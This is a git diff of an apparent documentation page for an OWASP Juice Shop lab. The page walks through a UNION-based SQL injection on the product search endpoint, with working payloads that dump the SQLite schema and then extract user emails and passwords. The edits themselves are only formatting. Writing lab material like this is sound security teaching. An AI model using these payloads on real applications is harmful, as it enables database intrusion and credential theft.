@@ -16,8 +16,8 @@ sidebar_position: 2
 - [Remediation](#remediation)
 - [Optional notes](#optional-notes)
 
-:::danger[WARNING]
-The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.
+:::danger[WARNING]  
+The content provided in this repository is for educational and ethical security testing purposes only. All demonstrations were performed in a controlled, local environment using the OWASP Juice Shop, a deliberately insecure web application. Unauthorized access to computing systems is illegal. The author is not responsible for any misuse of this information. Always obtain explicit permission before testing any system that you do not own.  
 :::
 
 ## Vulnerability Overview: SQL Injection
@@ -35,17 +35,17 @@ In the Juice Shop the `/rest/products/search?q=` endpoint is vulnerable to UNION
 ## Reproduction Steps
 ### 1. Identify the Entry Point
 Capture a search request in Burp Suite and send it to the **Repeater**:  
-```
+```http
 GET /rest/products/search?q=
 ```
 
 ### 2. Trigger an Error to Leak the Query
 Input a malformed query, like `'!`, to force a syntax error:
-```
+```http
 GET /rest/products/search?q='!
 ```
 And observe how the server returns a `500 Internal Server Error` leaking the database used, `SQLite`, and revealing the internal query structure:
-```
+```sql
 SELECT * FROM Products WHERE ((name LIKE '%'!' OR description LIKE '%'!') AND deletedAt IS NULL) ORDER BY name
 ```
 
@@ -56,30 +56,30 @@ Knowing that database used, navigate to the official website and find where the 
 The original query (the one fetching Products data) selects a specific number of columns. To use `UNION`, your injected query **must** match that count. *Fuzz* the columns manually using Burp Repeater.  
 
 Start by selecting a single one from `sqlite_master`:
-```
+```sql
 GET /rest/products/search?q=')) UNION SELECT 1 FROM sqlite_master--
 ```
-If the server rreturns an error, the column count doesn't match. Incrementally add columns:
-```
+If the server returns an error, the column count doesn't match. Incrementally add columns:
+```sql
 GET /rest/products/search?q=')) UNION SELECT 1,2 FROM sqlite_master--
 ```
 Continue until eventually a success response is returned. In this case the count is 9:
-```
+```sql
 GET /rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master--
 ```
 
-:::tip
-Replace the space between characters with a `+` or encode the entire payload in `URI` format or `base64` to ensure a correct parsing
+:::tip  
+Replace the spaces between characters with a `+` or encode the entire payload in `URI` format to ensure a correct parsing.  
 :::
 
 You can *clean* the output to only display your injected data by nullifying the first part of the query, injecting an existing product or a non existent one:
-```
+```sql
 GET /rest/products/search?q=apple'))+UNION+SELECT+1,2,3,4,5,6,7,8,9+FROM+sqlite_master--
 ```
 
 ### 5. Determine which Column can display text data
 After confirming the original column count, test which one can display text data. Inject a `'test'` string and observe in the response if the string is displayed (positive match). If not, proceed with the next one.
-```
+```sql
 GET /rest/products/search?q=apple'))+UNION+SELECT+'test',2,3,4,5,6,7,8,9+FROM+sqlite_master--
 ```
 
@@ -88,7 +88,7 @@ As last step, replace one of the placeholder with the `sql` column from the `sql
 The `sql` column is the one containing the `CREATE TABLE` statement, that  *is usually a copy of the original statement used to create the object*.
 
 Final Payload:
-```
+```sql
 apple'))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--
 ```
 The response will now contain the complete database schema.
@@ -100,14 +100,14 @@ The response will now contain the complete database schema.
 #### Difficulty: ★★★★
 #### Walktrough: Last 15 seconds of Database Schema Video
 
-:::info
-Since this challenge belongs to the same category and it's one injection directly after exfiltrating the Schema, it felt like a natural follow-up in the Chain of Attack, and therefore I included it at the end of the video.
+:::info  
+Since this challenge belongs to the same category and it's one injection directly after exfiltrating the Schema, it felt like a natural follow-up in the Chain of Attack, and therefore I included it at the end of the video.  
 :::
 
 The extracted schema displays the table `Users`, which contains the columns named `email` and `password`.  
 Change the payload to target that specific table:
 
-```
+```sql
 apple'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--
 ```
 
